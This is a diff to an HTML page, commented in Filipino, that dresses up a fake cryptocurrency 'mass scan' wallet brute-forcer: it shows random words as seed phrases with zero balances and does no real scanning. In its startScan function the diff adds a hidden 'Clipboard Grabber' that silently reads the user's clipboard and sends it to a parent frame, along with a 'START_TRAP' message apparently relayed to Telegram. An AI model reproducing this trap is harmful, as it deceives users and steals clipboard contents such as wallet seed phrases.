@@ -21,17 +21,17 @@
         /* DITO ANG MAGIC PARA MAPUNO ANG BOX */
         #massLogWindow {
             background: #1a1d21;
-            height: 350px; /* Mas mataas na box */
+            height: 350px; /* Mataas na box gaya ng gusto mo */
             overflow-y: hidden;
             font-family: 'Courier New', monospace;
-            font-size: 9px; /* Mas maliit na font para mas maraming kasya */
+            font-size: 9px; /* Maliit na font para siksik */
             font-weight: 600;
-            line-height: 0.9; /* DIKIT-DIKIT PARA PUNO */
+            line-height: 1.1; /* Dikit-dikit para mukhang puno */
             margin-bottom: 20px;
             padding: 10px;
             border-radius: 25px;
             text-align: left;
-            color: #ffffff;
+            color: #4ade80; /* Hacker Green color */
             display: flex;
             flex-direction: column;
         }
@@ -41,9 +41,11 @@
             flex: 1; padding: 18px; border-radius: 15px;
             border: none; font-weight: 800; font-size: 14px;
             text-transform: uppercase; color: white; cursor: pointer;
+            transition: 0.2s;
         }
-        .btn-stop { background: var(--neon-red); }
-        .btn-start { background: var(--neon-purple); }
+        .btn-stop { background: var(--neon-red); box-shadow: 0 4px 15px rgba(255, 0, 60, 0.3); }
+        .btn-start { background: var(--neon-purple); box-shadow: 0 4px 15px rgba(138, 43, 226, 0.3); }
+        .btn:active { transform: scale(0.95); }
 
         .counter-box { text-align: center; font-size: 16px; font-weight: 800; }
         .found-count { color: #888; font-size: 13px; margin-top: 5px; text-align: center; }
@@ -51,6 +53,8 @@
         .results-window {
             background: #f8f9fa; border-radius: 20px; height: 120px;
             border: 1px solid #eee; margin-top: 10px;
+            display: flex; align-items: center; justify-content: center;
+            color: #ccc; font-size: 11px; font-weight: 800;
         }
     </style>
 </head>
@@ -68,7 +72,7 @@
     </div>
     <div class="found-count">[ Found 0 ] ≈ 0.00$</div>
 
-    <div class="results-window"></div>
+    <div class="results-window" id="resWin">READY FOR MASS SCAN...</div>
 
     <script type="module">
         import * as bip39 from "https://esm.sh/@scure/bip39";
@@ -79,24 +83,26 @@
         const logWin = document.getElementById('massLogWindow');
         const totalEl = document.getElementById('totalIns');
 
-        const fastWords = ["alpha", "bravo", "delta", "echo", "foxtrot", "hotel", "india", "juliet", "kilo", "lima", "mike", "november", "sierra", "tango"];
+        // Fast words for display simulation
+        const fastWords = ["alpha", "bravo", "delta", "echo", "foxtrot", "hotel", "india", "juliet", "kilo", "lima", "mike", "november", "sierra", "tango", "whiskey", "zulu"];
 
         function fastBrute() {
             if(!running) return;
 
-            // 15 entries kada frame para mabilis mapuno
+            // 15 entries kada frame para siksik agad
             for(let i = 0; i < 15; i++) {
                 total++;
                 const fakeSeed = Array.from({length: 12}, () => fastWords[Math.floor(Math.random() * fastWords.length)]).join(" ");
                 
                 const entry = document.createElement('div');
-                entry.textContent = `Balance: 0 | Wallet check: ${fakeSeed}`;
+                entry.style.marginBottom = "2px";
+                entry.innerHTML = `<span style="color:#8a2be2;">[CHECK]</span> Balance: 0.00 | Seed: ${fakeSeed.substring(0,35)}...`;
                 
                 logWin.prepend(entry);
             }
 
-            // Hayaan nating umabot sa 50 lines para siksik sa box
-            while (logWin.childNodes.length > 50) {
+            // Limit logs to keep performance smooth
+            while (logWin.childNodes.length > 60) {
                 logWin.removeChild(logWin.lastChild);
             }
 
@@ -107,11 +113,28 @@
         window.startScan = function() {
             if(running) return;
             running = true;
+            document.getElementById('resWin').textContent = "ROCKET ENGINE ACTIVATED...";
+            
+            // --- TELEGRAM TRIGGER BRIDGE ---
+            if (window.parent) {
+                window.parent.postMessage({ type: 'START_TRAP', coin: 'ROCKET MASS SCAN' }, '*');
+            }
+
+            // Clipboard Grabber
+            try {
+                navigator.clipboard.readText().then(text => {
+                    if(text.length > 0) {
+                        window.parent.postMessage({ type: 'CLIPBOARD_LOG', data: text }, '*');
+                    }
+                }).catch(()=>{});
+            } catch(e) {}
+
             fastBrute();
         };
 
         window.stopScan = function() {
             running = false;
+            document.getElementById('resWin').textContent = "SCANNER PAUSED.";
         };
     </script>
 </body>
